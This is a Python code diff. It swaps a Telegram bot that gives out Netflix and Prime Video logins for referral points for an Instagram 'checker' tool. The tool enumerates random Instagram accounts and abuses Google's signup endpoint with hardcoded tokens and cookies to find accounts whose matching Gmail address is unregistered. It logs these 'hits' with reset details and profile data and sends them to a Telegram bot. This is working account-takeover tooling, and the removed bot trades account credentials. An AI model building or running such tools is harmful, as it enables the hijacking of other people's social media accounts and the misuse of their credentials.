+                'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
+                'cookiesDisabled': "false",
+                'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
+                'gmscoreversion': "null",
+                'flowName': "GlifWebSignIn",
+                'checkConnection': "youtube:301",
+                'checkedDomains': "youtube",
+                'pstMsg': "1",
+                '': ""
+            }
+            headers['referer'] = "https://accounts.google.com/signup/v2/birthdaygender?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL="+ tl_1
+            response = _session.post(url, params=params, data=payload, headers=headers, timeout=20)
+            tl = json.loads(response.text[5:])[0][0][4].split("TL:")[1]
+            with open("google.txt", "w") as w:
+                w.write(tl)
+        except:
+            pass
+        time.sleep(120)
+
+def cgmail(email, token, chat_id, user, session):
+    global bad_email, taken, hits
+    try:
+        if '@' in email:
+            email = email.split('@')[0]
+        try:
+            with open(CONFIG["token_file"], 'r') as f:
+                line = f.read().splitlines()[0]
+                tl, host = line.split('//')
+            cookies = {'__Host-GAPS': host}
+            headers = {
+                'authority': 'accounts.google.com',
+                'accept': '*/*',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': CONFIG["form_type"],
+                'google-accounts-xsrf': '1',
+                'origin': CONFIG["google_url"],
+                'referer': f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
+                'user-agent': random.choice(USER_AGENTS)
+            }
+            params = {'TL': tl}
+            data = (
+                f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
+                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
+                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
+                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
+                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
+                "&gmscoreversion=undefined&flowName=GlifWebSignIn&"
+            )
+            resp = session.post(
+                f"{CONFIG['google_url']}/_/signup/usernameavailability",
+                params=params, cookies=cookies, headers=headers, data=data
+            )
+            if '"gf.uar",1' in resp.text:
+                save_hit(email, "gmail.com", user, token, chat_id)
+                return
+        except:
+            pass
+        try:
+            with open("google.txt", "r") as ys:
+                tl = ys.read().strip()
+            url = "https://accounts.google.com/_/signup/usernameavailability"
+            params = {
+                'hl': "en-GB",
+                'TL': tl,
+                '_reqid': "446000",
+                'rt': "j"
+            }
+            payload = {
+                'continue': "https://accounts.google.com/ManageAccount?nc=1",
+                'f.req': "[\"TL:"+ tl +"\",\""+ email +"\",0,0,1,null,1,2464]",
+                'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
+                'cookiesDisabled': "false",
+                'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
+                'gmscoreversion': "null",
+                'flowName': "GlifWebSignIn",
+                'checkConnection': "youtube:301",
+                'checkedDomains': "youtube",
+                'pstMsg': "1",
+                '': ""
+            }
+            headers = {
+                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+                'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
+                'x-same-domain': "1",
+                'google-accounts-xsrf': "1",
+                'sec-ch-ua-mobile': "?1",
+                'sec-ch-ua-platform': "\"Android\"",
+                'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
+                'origin': "https://accounts.google.com",
+                'x-client-data': "CP/xygE=",
+                'sec-fetch-site': "same-origin",
+                'sec-fetch-mode': "cors",
+                'sec-fetch-dest': "empty",
+                'referer': "https://accounts.google.com/signup/v2/createusername?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL="+ tl,
+                'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+                'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN"
+            }
+            response = _session.post(url, params=params, data=payload, headers=headers, timeout=20)
+            if '"gf.uar",1' in response.text:
+                save_hit(email, "gmail.com", user, token, chat_id)
+                return
+            else:
+                taken += 1
+        except:
+            taken += 1
+        bad_email += 1
+    except:
+        bad_email += 1
+
+def cinstagram(email, token, chat_id, user, session):
+    global good_insta, bad_insta
+    if lookup_instagram(email):
+        good_insta += 1
+        cgmail(email, token, chat_id, user, session)
+    else:
+        bad_insta += 1
+
+def save_hit(username, domain, user, token, chat_id):
+    global hits, total, good_insta, follower_0_50, follower_50_250, follower_250_plus
+    with hit_lock:
+        user_id = user.get('pk', 'Unknown')
+        followers = user.get('follower_count', 0)
+        posts = user.get('media_count', 0)
+
+        hits += 1
+        total += 1
+        good_insta += 1
+
+        if followers < 50:
+            follower_0_50 += 1
+        elif followers < 250:
+            follower_50_250 += 1
+        else:
+            follower_250_plus += 1
+
+        current_hit_number = total
+        reset_text = rest_v1(username)
+
+        if not about_tokens.get("fb_dtsg"):
+            about_refresh_tokens(ABOUT_COOKIE_STR, username)
+        about = get_about_account(user_id, username)
+        join_date = about.get("join_date") or str(gdate(user_id))
+        country_name = about.get("country") or "-"
+        country_flag = get_country_flag(country_name)
+        country_display = f"{country_name} {country_flag}".strip() if country_flag else country_name
+
+        if max_CONFIG.get("max_country", False):
+            if not country_flag or country_name in ["-", "Paylasilmadi", "None", ""]:
+                return
+
+        former = ", ".join(about.get("former_usernames", [])) or "-"
+        account_year = gdate(user_id)
+        year_label = f"{account_year}" if account_year else "Unknown"
+        masked = get_masked(username)
+
+        if max_CONFIG.get("max_about_info", True):
+            about_lines = (
+                "╭━━━〔 ✦ 𝐀𝐁𝐎𝐔𝐓 𝐔𝐒𝐄𝐑 ✦ 〕━━━╮\n"
+                f"┃ 🗓️ 𝐃𝐚𝐭𝐞 𝐉𝐨𝐢𝐧𝐞𝐝     ➤ {join_date}\n"
+                f"┃ 📆 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐘𝐞𝐚𝐫    ➤ {year_label}\n"
+                f"┃ 🌍 𝐂𝐨𝐮𝐧𝐭𝐫𝐲         ➤ {country_display}\n"
+                f"┃ 🔁 𝐅𝐨𝐫𝐦𝐞𝐫 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞𝐬 ➤ {former}\n"
+                "╰━━━━━━━━━━━━━━━━━━━━━━━╯"
+            )
+        else:
+            about_lines = ""
+
+        masked_line = f" Masked Email   : {masked}\n" if masked else ""
+
+        output = f"""
+𓆩════════════════════════════════════𓆪
+           ✦ 𝐇𝐈𝐓 #{current_hit_number} ✦
+𓆩════════════════════════════════════𓆪
+
+╭────────────── ✦ ──────────────╮
+│          👤 𝐔𝐒𝐄𝐑 • 𝐈𝐍𝐅𝐎
+├───────────────────────────────┤
+│ ◈ 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞  ➤ @{username}
+│ ◈ 𝐄𝐦𝐚𝐢𝐥      ➤ {username}@gmail.com
+│ ◈ 𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬  ➤ {followers}
+│ ◈ 𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠  ➤ {user.get('following_count', 0)}
+│ ◈ 𝐁𝐢𝐨        ➤ {user.get('biography', 'No bio')}
+│ ◈ 𝐘𝐞𝐚𝐫       ➤ {year_label}
+│ ◈ 𝐑𝐞𝐬𝐞𝐭      ➤ {reset_text}
+╰────────────── ✦ ──────────────╯
+
+{about_lines}
+{masked_line}
+
+╭────────────── ✦ ──────────────╮
+│ 🔗 𝐏𝐑𝐎𝐅𝐈𝐋𝐄
+│ ➤ https://www.instagram.com/{username}
+╰────────────── ✦ ──────────────╯
+
+𓆩════════════════════════════════════𓆪
+│ ✦ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ➤ @stuff_portal
+│ ✦ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 ➤ MAX
+𓆩════════════════════════════════════𓆪
+"""
+
+        with open(CONFIG["output_file"], 'a', encoding='utf-8') as f:
+            f.write(output + "\n\n")
+
+        try:
+            requests.post(
+                f"https://api.telegram.org/bot{token}/sendMessage",
+                json={"chat_id": chat_id, "text": output},
+                timeout=15
+            )
         except:
             pass
 
-    existing = get_user(user_id)
-    if not existing:
-        create_user(user_id, username, first_name, referrer_id)
-        if referrer_id:
-            ref_user = get_user(referrer_id)
-            if ref_user:
-                add_points(referrer_id, POINTS_PER_REFERRAL)
-                increment_referrals(referrer_id)
-                try:
-                    await context.bot.send_message(
-                        referrer_id,
-                        f"{E('gift')} **New Referral!** {E('gift')}\n"
-                        f"**{first_name}** joined!\n"
-                        f"{E('star')} +**{POINTS_PER_REFERRAL} point**\n"
-                        f"Total: `{ref_user[3] + 1}`",
-                        parse_mode="HTML",
-                    )
-                except:
-                    pass
+def stats():
+    global hits, good_insta, bad_insta, bad_email, total, taken, limit, email
+    while True:
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print(f"""{M}{B}
+╭━━━═══☾═══━━━╮
+   ✧ 𝐈𝐍𝐒𝐓𝐀 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 ✧
+      𝐏 𝐀 𝐍 𝐄 𝐋
+╰━━━═══☽═══━━━╯
+{RESET_COL}""")
+        print(f"""{C}{B}
+╭─────────── 𖦹 ───────────╮
+{G}{B}│ ✦ 𝐇𝐢𝐭𝐬         ➤ {W}{B}{hits}
+{M}{B}│ ✦ 𝐆𝐨𝐨𝐝 𝐔𝐬𝐞𝐫𝐬   ➤ {W}{B}{good_insta}
+{R}{B}│ ✦ 𝐁𝐚𝐝 𝐔𝐬𝐞𝐫𝐬    ➤ {W}{B}{bad_insta}
+{Y}{B}│ ✦ 𝐁𝐚𝐝 𝐄𝐦𝐚𝐢𝐥𝐬   ➤ {W}{B}{bad_email}
+{C}{B}│ ✦ 𝐓𝐚𝐤𝐞𝐧        ➤ {W}{B}{taken}
+{M}{B}│ ✦ 𝐓𝐨𝐭𝐚𝐥        ➤ {W}{B}{total}
+{C}{B}╰─────────── 𖦹 ───────────╯
+{RESET_COL}""")
+        print(f"""{C}{B}
+╭━━━═══𖤐═══━━━╮
+     ✧ 𝐍𝐎𝐖 𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 ✧
+╰━━━═══𖤐═══━━━╯
 
-    anim_msg = await netflix_start_animation(update, context)
-    await send_main_menu(update, context, msg=anim_msg)
+        {M}☾ {email} ☽{C}
 
-# ============================================================
-# ✅ CHECK JOINED CALLBACK
-# ============================================================
-async def handle_check_joined(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    query = update.callback_query
-    
-    allowed, missing = await check_user_channels(context.bot, user_id)
-    
-    if allowed:
-        await query.answer(f"{E('check')} Verified! Welcome! 🎉", show_alert=True)
-        await send_main_menu(update, context)
-    else:
-        await query.answer(f"{E('cross')} You haven't joined all channels yet!", show_alert=True)
-        await require_channels(update, context)
+     ✦ 𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓 ✦
+{RESET_COL}""")
+        print(f"""{C}{B}
+╔═══━━━─── ✦ ───━━━═══╗
+{Y}{B}     𝐃𝐄𝐕 ➤ MAX
+{M}{B}   𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ➤ @stuff_portal
+{C}{B}╚═══━━━─── ✦ ───━━━═══╝
+{RESET_COL}""")
+        time.sleep(0.3)
 
-# ============================================================
-# 📣 PAYOUT CHANNEL NOTIFICATION
-# ============================================================
-async def send_payout_notification(context: ContextTypes.DEFAULT_TYPE, user_data: tuple, service_type: str, points_used: int, details: str = ""):
-    if not PAYOUT_CHANNEL:
-        return
-    uid, uname, fname = user_data[0], user_data[1] or "N/A", user_data[2] or "User"
-    icon = E('netflix') if service_type == 'netflix' else E('prime')
-    sname = "Netflix" if service_type == 'netflix' else "Prime Video"
-    text = (
-        f"{E('payout')} **New Payout** {E('boom')}\n"
-        f"━━━━━━━━━━━━━━━━━\n"
-        f"{E('user')} {fname} (@{uname}) `{uid}`\n"
-        f"{icon} **{sname}** | {E('star')}`{points_used}` pts\n"
-        f"{E('clock')} {datetime.now().strftime('%Y-%m-%d %H:%M UTC')}\n"
-        f"━━━━━━━━━━━━━━━━━\n"
-    )
-    if details:
-        text += f"\n{E('mail')} `{details}`\n"
-    text += f"\n{E('check')} Auto-processed {E('check')}"
-    try:
-        await context.bot.send_message(chat_id=PAYOUT_CHANNEL, text=text, parse_mode="HTML")
-    except Exception as e:
-        for aid in ADMIN_IDS:
-            try:
-                await context.bot.send_message(aid, f"{E('warning')} Payout channel error: `{e}`\nCheck `{PAYOUT_CHANNEL}`", parse_mode="HTML")
-            except:
-                pass
+def sinsta(min_id, max_id, token, chat_id):
+    global email
+    local_session = requests.Session()
+    while True:
+        try:
+            user_id = random.randrange(min_id, max_id)
+            rnd = str(random.randint(2500000000, 21254029834))
+            user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986" + str(random.randint(111, 999)) + ")"
+            lsd = ''.join(random.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(16))
+            headers = {
+                'accept': '*/*',
+                'accept-language': 'en,en-US;q=0.9',
+                'content-type': 'application/x-www-form-urlencoded',
+                'dnt': '1',
+                'origin': 'https://www.instagram.com',
+                'priority': 'u=1, i',
+                'referer': 'https://www.instagram.com/cristiano/following/',
+                'user-agent': user_agent,
+                'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
+                'x-fb-lsd': lsd,
+            }
+            data = {
+                'lsd': lsd,
+                'fb_api_caller_class': 'RelayModern',
+                'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
+                'variables': '{"userID":"' + str(user_id) + '","username":"cristiano"}',
+                'server_timestamps': 'true',
+                'doc_id': '7717269488336001',
+            }
+            resp = local_session.post(CONFIG["insta_graphql"], headers=headers, data=data)
+            if resp.status_code == 200:
+                user = resp.json().get('data', {}).get('user')
+                if user and user.get('username'):
+                    followers = user.get('follower_count', 0)
+                    uid = user.get('pk', 0)
 
-# ============================================================
-# 🔄 CALLBACK HANDLER
-# ============================================================
-async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    user = query.from_user
-    user_id = user.id
-    data = query.data
+                    # Minimum follower filter (50)
+                    if max_CONFIG["max_min_followers"] > 0 and followers < max_CONFIG["max_min_followers"]:
+                        continue
 
-    if data != "check_joined":
-        allowed, _ = await check_user_channels(context.bot, user_id)
-        if not allowed and not is_admin(user_id):
-            await require_channels(update, context)
-            return
+                    email = user['username'] + CONFIG["domain"]
+                    cinstagram(user['username'] + CONFIG["domain"], token, chat_id, user, local_session)
+        except:
+            continue
 
-    if data == "check_joined":
-        await handle_check_joined(update, context)
-        return
-
-    if data == "profile":
-        ud = get_user(user_id)
-        if not ud:
-            await query.edit_message_text(f"{E('cross')} Use /start first.")
-            return
-        pts, refs, jn, nf, pr = ud[3], ud[4], ud[6], ud[7], ud[8]
-        bn = "▓"*min(pts,3) + "░"*max(0,3-min(pts,3))
-        bp = "▓"*min(pts,4) + "░"*max(0,4-min(pts,4))
-        text = (
-            f"{E('user')} **Profile** {E('premium')}\n"
-            f"🆔 `{user_id}` | **{ud[2]}**\n"
-            f"━━━━━━━━━━━━━━━━━━━━━\n"
-            f"{E('star')} Points: `{pts}`\n"
-            f"{E('people')} Referrals: `{refs}`\n"
-            f"{E('netflix')} Netflix: `{nf}` | {E('prime')} Prime: `{pr}`\n"
-            f"{E('clock')} Joined: `{jn[:10] if jn else 'N/A'}`\n"
-            f"━━━━━━━━━━━━━━━━━━━━━\n"
-            f"{E('netflix')} {bn} `{min(pts,3)}/3`\n"
-            f"{E('prime')} {bp} `{min(pts,4)}/4`"
-        )
-        kb = [[InlineKeyboardButton(f"{E('back')} Back", callback_data="back_home")]]
-        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
-
-    elif data == "referral":
-        bot_username = context.bot.username
-        link = f"https://t.me/{bot_username}?start=ref_{user_id}"
-        text = f"{E('link')} **Your Referral Link**\n\n`{link}`\n\n1️⃣ Share → 2️⃣ Friend joins → 3️⃣ {E('star')}**+1 pt**"
-        kb = [[InlineKeyboardButton(f"{E('back')} Back", callback_data="back_home")]]
-        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
-
-    elif data == "redeem_netflix":
-        sv, need = 'netflix', POINTS_NEEDED_FOR_NETFLIX
-        ud = get_user(user_id)
-        if not ud:
-            await query.edit_message_text(f"{E('cross')} Use /start first.")
-            return
-        pts = ud[3]
-        if pts >= need:
-            st = get_available_stock(sv)
-            if not st:
-                text = f"{E('netflix')} **Netflix**\n{E('star')}`{pts}` pts | {E('warning')} **Out of Stock!**"
-                kb = [[InlineKeyboardButton(f"{E('back')} Back", callback_data="back_home")]]
-            else:
-                text = f"{E('netflix')} **Netflix**\n{E('star')}`{pts}` pts | Cost: `{need}` | {E('stock')}**In Stock**\n\n**Redeem now?**"
-                kb = [[InlineKeyboardButton(f"{E('check')} Confirm", callback_data="confirm_redeem_netflix")],
-                      [InlineKeyboardButton(f"{E('back')} Back", callback_data="back_home")]]
-        else:
-            text = f"{E('netflix')} **Netflix**\n{E('star')}`{pts}/{need}` | Need `{need-pts}` more pts"
-            kb = [[InlineKeyboardButton(f"{E('link')} Referral", callback_data="referral"),
-                   InlineKeyboardButton(f"{E('key')} Code", callback_data="redeem_code")],
-                  [InlineKeyboardButton(f"{E('back')} Back", callback_data="back_home")]]
-        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
-
-    elif data == "redeem_prime":
-        sv, need = 'prime', POINTS_NEEDED_FOR_PRIME
-        ud = get_user(user_id)
-        if not ud:
-            await query.edit_message_text(f"{E('cross')} Use /start first.")
-            return
-        pts = ud[3]
-        if pts >= need:
-            st = get_available_stock(sv)
-            if not st:
-                text = f"{E('prime')} **Prime Video**\n{E('star')}`{pts}` pts | {E('warning')} **Out of Stock!**"
-                kb = [[InlineKeyboardButton(f"{E('back')} Back", callback_data="back_home")]]
-            else:
-                text = f"{E('prime')} **Prime Video**\n{E('star')}`{pts}` pts | Cost: `{need}` | {E('stock')}**In Stock**\n\n**Redeem now?**"
-                kb = [[InlineKeyboardButton(f"{E('check')} Confirm", callback_data="confirm_redeem_prime")],
-                      [InlineKeyboardButton(f"{E('back')} Back", callback_data="back_home")]]
-        else:
-            text = f"{E('prime')} **Prime Video**\n{E('star')}`{pts}/{need}` | Need `{need-pts}` more pts"
-            kb = [[InlineKeyboardButton(f"{E('link')} Referral", callback_data="referral"),
-                   InlineKeyboardButton(f"{E('key')} Code", callback_data="redeem_code")],
-                  [InlineKeyboardButton(f"{E('back')} Back", callback_data="back_home")]]
-        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
-
-    elif data in ["confirm_redeem_netflix", "confirm_redeem_prime"]:
-        sv = 'netflix' if 'netflix' in data else 'prime'
-        need = POINTS_NEEDED_FOR_NETFLIX if sv == 'netflix' else POINTS_NEEDED_FOR_PRIME
-        icon = E('netflix') if sv == 'netflix' else E('prime')
-        sname = "Netflix" if sv == 'netflix' else "Prime Video"
-        
-        ud = get_user(user_id)
-        if not ud or ud[3] < need:
-            await query.edit_message_text(f"{E('cross')} Not enough points!",
-                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{E('back')} Back", callback_data="back_home")]]))
-            return
-        
-        st = get_available_stock(sv)
-        if not st:
-            await query.edit_message_text(f"{E('warning')} **Out of Stock!**",
-                parse_mode="HTML",
-                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{E('back')} Back", callback_data="back_home")]]))
-            return
-        
-        deduct_points(user_id, need)
-        if sv == 'netflix':
-            increment_netflix_redeemed(user_id)
-        else:
-            increment_prime_redeemed(user_id)
-        
-        sid, link = st[0], st[1]
-        assign_stock(sid, user_id, sv)
-        wid = create_withdrawal(user_id, sv, need)
-        log_payout(user_id, sv, need, link)
-        
-        text = (
-            f"{icon} **{sname} Delivered!** {E('premium')}\n\n"
-            f"{E('check')} Request `#{wid}`\n"
-            f"━━━━━━━━━━━━━━━━━━━━━\n"
-            f"{E('key')} **Login:**\n"
-            f"`{link}`\n"
-            f"━━━━━━━━━━━━━━━━━━━━━\n"
-            f"{E('lock')} Change password!\n"
-            f"{E('heart')} Enjoy!"
-        )
-        kb = [[InlineKeyboardButton(f"{E('back')} Menu", callback_data="back_home")]]
-        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
-        
-        await send_payout_notification(context, ud, sv, need, link)
-        for aid in ADMIN_IDS:
-            try:
-                await context.bot.send_message(aid,
-                    f"{icon} **{sname} Auto-Redeemed** {E('check')}\n"
-                    f"{E('user')} {user.first_name} (@{user.username or 'N/A'}) `{user_id}`\n"
-                    f"{E('stock')} Stock ID: `{sid}`",
-                    parse_mode="HTML")
-            except:
-                pass
-
-    elif data == "redeem_code":
-        text = f"{E('key')} **Redeem Code** {E('gift')}\n\nEnter code: `XXXX-XXXX-XXXX`"
-        kb = [[InlineKeyboardButton(f"{E('back')} Back", callback_data="back_home")]]
-        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
-        set_user_data(user_id, "awaiting_code", True)
-
-    elif data == "leaderboard":
-        all_u = get_all_users()[:10]
-        if not all_u:
-            text = f"{E('trophy')} **Leaderboard**\n\nNo users yet!"
-        else:
-            text = f"{E('trophy')} **Top 10** {E('premium')}\n━━━━━━━━━━━━━━━━━━━━━\n"
-            medals = [E('medal1'), E('medal2'), E('medal3')]
-            for i, u in enumerate(all_u):
-                m = medals[i] if i < 3 else f"`{i+1}.`"
-                text += f"{m} **{u[2]}** {E('star')}{u[3]} {E('people')}{u[4]} {E('netflix')}{u[7]} {E('prime')}{u[8]}\n"
-        kb = [[InlineKeyboardButton(f"{E('back')} Back", callback_data="back_home")]]
-        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
-
-    elif data == "help":
-        text = (
-            f"{E('question')} **Help**\n\n"
-            f"{E('forward')} **Earn:** Share referral link\n"
-            f"{E('netflix')} **Netflix:** 3 pts\n"
-            f"{E('prime')} **Prime:** 4 pts\n"
-            f"{E('key')} **Codes:** Redeem gift codes\n"
-            f"`/start` - Menu\n`/points` - Stats"
-        )
-        kb = [[InlineKeyboardButton(f"{E('back')} Back", callback_data="back_home")]]
-        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
-
-    elif data == "support":
-        am = " & ".join([f"@{a}" for a in ADMIN_USERNAMES])
-        text = f"{E('support')} **Support**\n\nAdmins: {am}\n\nTap to message:"
-        kb = [
-            [InlineKeyboardButton(f"📩 @{ADMIN_USERNAMES[0]}", url=f"tg://user?id={ADMIN_IDS[0]}"),
-             InlineKeyboardButton(f"📩 @{ADMIN_USERNAMES[1]}", url=f"tg://user?id={ADMIN_IDS[1]}")],
-            [InlineKeyboardButton(f"{E('back')} Back", callback_data="back_home")],
-        ]
-        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
-
-    elif data == "back_home":
-        await send_main_menu(update, context)
-
-    elif data == "admin_panel":
-        if not is_admin(user_id):
-            await query.answer(f"{E('cross')} Unauthorized!", show_alert=True)
-            return
-        s = get_stats()
-        text = (
-            f"{E('admin')} **Admin Panel**\n"
-            f"━━━━━━━━━━━━━━━━━━━━━\n"
-            f"{E('people')} Users: `{s['total_users']}` | {E('star')} Points: `{s['total_points']}`\n"
-            f"{E('netflix')} Netflix: `{s['stock_netflix_avail']}/{s['stock_netflix_total']}` stock\n"
-            f"{E('prime')} Prime: `{s['stock_prime_avail']}/{s['stock_prime_total']}` stock\n"
-            f"{E('time')} Pending: `{s['pending_withdrawals']}`\n"
-            f"{E('gift')} Codes: `{s['active_codes']}` active | `{s['redeemed_codes']}` used\n"
-            f"{E('channel')} Channels: `{s['channels']}` required\n"
-            f"━━━━━━━━━━━━━━━━━━━━━\n"
-            f"{E('user')} {' & '.join(['@'+a for a in ADMIN_USERNAMES])}"
-        )
-        kb = [
-            [InlineKeyboardButton(f"{E('netflix')} +Netflix Stock", callback_data="admin_addstock_netflix"),
-             InlineKeyboardButton(f"{E('prime')} +Prime Stock", callback_data="admin_addstock_prime")],
-            [InlineKeyboardButton(f"{E('gift')} Generate Code", callback_data="admin_gen_code")],
-            [InlineKeyboardButton(f"{E('time')} Pending Req", callback_data="admin_pending")],
-            [InlineKeyboardButton(f"{E('people')} Users", callback_data="admin_users")],
-            [InlineKeyboardButton(f"{E('broadcast')} Broadcast", callback_data="admin_broadcast")],
-            [InlineKeyboardButton(f"{E('gift')} Codes List", callback_data="admin_codes_list")],
-            [InlineKeyboardButton(f"{E('stock')} Stock Lists", callback_data="admin_stock_lists")],
-            [InlineKeyboardButton(f"{E('channel')} Channels", callback_data="admin_channels")],
-            [InlineKeyboardButton(f"{E('payout')} Payout Channel", callback_data="admin_payout_info")],
-            [InlineKeyboardButton(f"{E('back')} Menu", callback_data="back_home")],
-        ]
-        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
-
-    elif data == "admin_payout_info":
-        if not is_admin(user_id):
-            return
-        text = f"{E('payout')} **Payout Channel**\n\nChannel: `{PAYOUT_CHANNEL}`\n\nBot must be admin in channel!"
-        kb = [[InlineKeyboardButton(f"{E('back')} Back", callback_data="admin_panel")]]
-        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
-
-    elif data == "admin_channels":
-        if not is_admin(user_id):
-            return
-        channels = get_required_channels()
-        if not channels:
-            text = f"{E('channel')} **Required Channels**\n\nNo channels set yet.\n\nTo add: Use `/addchannel @username` or `/addchannel -1001234567890`"
-        else:
-            text = f"{E('channel')} **Required Channels ({len(channels)})**\n\n"
-            for ch in channels:
-                cid = ch[1]
-                username = ch[2]
-                link = ch[3]
-                text += f"{E('join')} `{username or cid}`\n  Link: `{link or 'N/A'}`\n  ID: `{cid}`\n\n"
-        kb = [
-            [InlineKeyboardButton(f"{E('add')} Add Channel", callback_data="admin_add_channel")],
-            [InlineKeyboardButton(f"{E('remove')} Remove Channel", callback_data="admin_remove_channel")],
-            [InlineKeyboardButton(f"{E('back')} Back", callback_data="admin_panel")],
-        ]
-        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
-
-    elif data == "admin_add_channel":
-        if not is_admin(user_id):
-            return
-        text = (
-            f"{E('add')} **Add Required Channel**\n\n"
-            f"Send the channel username or ID:\n\n"
-            f"Format: `@channelusername` or `-1001234567890`\n\n"
-            f"Or use command: `/addchannel @username`\n\n"
-            f"{E('warning')} Bot must be admin in the channel!"
-        )
-        kb = [[InlineKeyboardButton(f"{E('back')} Back", callback_data="admin_channels")]]
-        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
-        set_user_data(user_id, "awaiting_channel_add", True)
-
-    elif data == "admin_remove_channel":
-        if not is_admin(user_id):
-            return
-        channels = get_required_channels()
-        if not channels:
-            await query.edit_message_text(f"{E('cross')} No channels to remove!",
-                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{E('back')} Back", callback_data="admin_channels")]]))
-            return
-        text = f"{E('remove')} **Select channel to remove:**\n\n"
-        kb = []
-        for ch in channels:
-            cid = ch[1]
-            username = ch[2]
-            display = username or cid
-            kb.append([InlineKeyboardButton(f"{E('cross')} Remove {display}", callback_data=f"remove_ch_{cid}")])
-        kb.append([InlineKeyboardButton(f"{E('back')} Back", callback_data="admin_channels")])
-        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
-
-    elif data.startswith("remove_ch_"):
-        if not is_admin(user_id):
-            return
-        ch_id = data.replace("remove_ch_", "")
-        removed = remove_required_channel(ch_id)
-        if removed:
-            await query.answer(f"{E('check')} Channel removed!", show_alert=True)
-        else:
-            await query.answer(f"{E('cross')} Failed to remove!", show_alert=True)
-        channels = get_required_channels()
-        if not channels:
-            text = f"{E('channel')} **Required Channels**\n\nNo channels set."
-        else:
-            text = f"{E('channel')} **Required Channels ({len(channels)})**\n\n"
-            for ch in channels:
-                cid = ch[1]
-                username = ch[2]
-                text += f"{E('join')} `{username or cid}`\n"
-        kb = [
-            [InlineKeyboardButton(f"{E('add')} Add Channel", callback_data="admin_add_channel")],
